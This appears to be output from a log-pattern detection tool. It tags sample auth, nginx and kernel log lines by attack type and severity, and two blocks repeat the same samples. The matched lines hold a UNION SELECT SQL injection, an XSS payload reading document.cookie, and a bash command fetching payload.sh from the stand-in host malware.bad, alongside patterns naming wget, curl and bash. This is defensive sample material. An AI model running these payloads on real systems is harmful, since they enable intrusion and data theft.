[2026-08-03 02:22:38] LINE:1 TYPE:LOGIN_FAIL SEV:high PAT:(FAIL|INVALID)*(LOGIN|ACCESS)* LOG:"FAILFAILLOGIN user attempted login"
[2026-08-03 02:22:38] LINE:2 TYPE:LOGIN_FAIL SEV:high PAT:(FAIL|INVALID)*(LOGIN|ACCESS)* LOG:"INVALIDFAILACCESSACCESS system blocked access"
[2026-08-03 02:22:38] LINE:3 TYPE:SQL_INJECT SEV:medium PAT:(SELECT|INSERT|UPDATE)*(FROM|WHERE)* LOG:"SELECTSELECTFROM table read attempt"
[2026-08-03 02:22:38] LINE:4 TYPE:SQL_INJECT SEV:medium PAT:(SELECT|INSERT|UPDATE)*(FROM|WHERE)* LOG:"UPDATEWHEREWHERE admin forced update"
[2026-08-03 02:22:38] LINE:5 TYPE:SQL_INJECT SEV:medium PAT:(SELECT|INSERT|UPDATE)*(FROM|WHERE)* LOG:"INSERTSELECTFROMFROM multi command sequence"
[2026-08-03 02:22:38] LINE:6 TYPE:ALERT_SEQ SEV:low PAT:(WARN|ERROR)*(ABCD)*(WARN|ERROR)* LOG:"WARNWARNABCDERROR pattern detected"
[2026-08-03 02:22:38] LINE:7 TYPE:ALERT_SEQ SEV:low PAT:(WARN|ERROR)*(ABCD)*(WARN|ERROR)* LOG:"ERRORABCDABCDWARN multi warning"
[2026-08-03 02:22:38] LINE:8 TYPE:ALERT_SEQ SEV:low PAT:(WARN|ERROR)*(ABCD)*(WARN|ERROR)* LOG:"ABCD standalone pattern observed"
[2026-08-03 02:22:38] LINE:9 TYPE:ALERT_SEQ SEV:low PAT:(WARN|ERROR)*(ABCD)*(WARN|ERROR)* LOG:"WARNERRORERROR unusual alert sequence"
[2026-08-03 02:28:54] LINE:1 TYPE:SSH_BRUTEFORCE SEV:high PAT:(Failed|Invalid|Deny)*(password|user|root)* LOG:"Jul 27 01:15:02 auth-server sshd[1402]: Failed password for root from 192.168.1.105 port 44210 ssh2"
[2026-08-03 02:28:54] LINE:2 TYPE:SSH_BRUTEFORCE SEV:high PAT:(Failed|Invalid|Deny)*(password|user|root)* LOG:"Jul 27 01:15:05 auth-server sshd[1405]: Invalid user admin from 10.0.0.45 port 51234"
[2026-08-03 02:28:54] LINE:3 TYPE:SSH_BRUTEFORCE SEV:high PAT:(Failed|Invalid|Deny)*(password|user|root)* LOG:"Jul 27 01:16:12 web-api nginx[8812]: GET /search?q=UNION SELECT FROM users WHERE 1=1 HTTP/1.1 200"
[2026-08-03 02:28:54] LINE:3 TYPE:SQL_INJECTION SEV:critical PAT:(SELECT|UNION|INSERT|DELETE)*(FROM|WHERE|SCHEMA)* LOG:"Jul 27 01:16:12 web-api nginx[8812]: GET /search?q=UNION SELECT FROM users WHERE 1=1 HTTP/1.1 200"
[2026-08-03 02:28:54] LINE:4 TYPE:XSS_ATTACK SEV:medium PAT:(script|javascript|onerror)*(alert|eval|cookie)* LOG:"Jul 27 01:17:45 web-api nginx[8814]: POST /comment payload=<script>alert(document.cookie)</script> HTTP/1.1 400"
[2026-08-03 02:28:54] LINE:5 TYPE:CMD_INJECTION SEV:critical PAT:(bin/sh|bin/bash|cmd.exe)*(wget|curl|chmod)* LOG:"Jul 27 01:18:22 edge-gw app[9921]: Executing command /bin/bash -c wget http://malware.bad/payload.sh"
[2026-08-03 02:28:54] LINE:6 TYPE:SCANNER_PROBE SEV:low PAT:(Nmap|Nikto|Sqlmap|Gobuster)*(Scan|Probe|Test)* LOG:"Jul 27 01:19:01 edge-gw app[9925]: User-Agent: Nikto/2.1.6 Scanner Test probe active"
[2026-08-03 02:28:54] LINE:7 TYPE:SYSTEM_FAULT SEV:medium PAT:(Kernel|OOM|Panic)*(Segmentation|out_of_memory)* LOG:"Jul 27 01:20:10 kernel-srv kernel: [ 4521.102] Kernel panic - out_of_memory killer invoked"
[2026-08-03 02:29:17] LINE:1 TYPE:SSH_BRUTEFORCE SEV:high PAT:(Failed|Invalid|Deny)*(password|user|root)* LOG:"Jul 27 01:15:02 auth-server sshd[1402]: Failed password for root from 192.168.1.105 port 44210 ssh2"
[2026-08-03 02:29:17] LINE:2 TYPE:SSH_BRUTEFORCE SEV:high PAT:(Failed|Invalid|Deny)*(password|user|root)* LOG:"Jul 27 01:15:05 auth-server sshd[1405]: Invalid user admin from 10.0.0.45 port 51234"
[2026-08-03 02:29:17] LINE:3 TYPE:SSH_BRUTEFORCE SEV:high PAT:(Failed|Invalid|Deny)*(password|user|root)* LOG:"Jul 27 01:16:12 web-api nginx[8812]: GET /search?q=UNION SELECT FROM users WHERE 1=1 HTTP/1.1 200"
[2026-08-03 02:29:17] LINE:3 TYPE:SQL_INJECTION SEV:critical PAT:(SELECT|UNION|INSERT|DELETE)*(FROM|WHERE|SCHEMA)* LOG:"Jul 27 01:16:12 web-api nginx[8812]: GET /search?q=UNION SELECT FROM users WHERE 1=1 HTTP/1.1 200"
[2026-08-03 02:29:17] LINE:4 TYPE:XSS_ATTACK SEV:medium PAT:(script|javascript|onerror)*(alert|eval|cookie)* LOG:"Jul 27 01:17:45 web-api nginx[8814]: POST /comment payload=<script>alert(document.cookie)</script> HTTP/1.1 400"
[2026-08-03 02:29:17] LINE:5 TYPE:CMD_INJECTION SEV:critical PAT:(bin/sh|bin/bash|cmd.exe)*(wget|curl|chmod)* LOG:"Jul 27 01:18:22 edge-gw app[9921]: Executing command /bin/bash -c wget http://malware.bad/payload.sh"
[2026-08-03 02:29:17] LINE:6 TYPE:SCANNER_PROBE SEV:low PAT:(Nmap|Nikto|Sqlmap|Gobuster)*(Scan|Probe|Test)* LOG:"Jul 27 01:19:01 edge-gw app[9925]: User-Agent: Nikto/2.1.6 Scanner Test probe active"
[2026-08-03 02:29:17] LINE:7 TYPE:SYSTEM_FAULT SEV:medium PAT:(Kernel|OOM|Panic)*(Segmentation|out_of_memory)* LOG:"Jul 27 01:20:10 kernel-srv kernel: [ 4521.102] Kernel panic - out_of_memory killer invoked"
